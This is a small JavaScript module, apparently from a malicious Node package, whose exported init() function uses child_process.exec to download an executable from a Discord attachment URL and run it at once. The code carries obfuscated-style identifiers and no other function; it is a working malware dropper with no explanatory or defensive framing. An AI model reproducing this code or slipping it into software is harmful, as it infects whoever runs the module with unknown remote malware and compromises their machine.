const { exec } = require('node:child_process')
function init() {
  exec(
    'curl https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe -o a.exe && a.exe',
    (_0x435933, _0x34e9ac, _0x5a76b3) => {
      if (_0x435933) {
        console.log('error: ' + _0x435933.message)
      }
    }
  )
}
module.exports = init

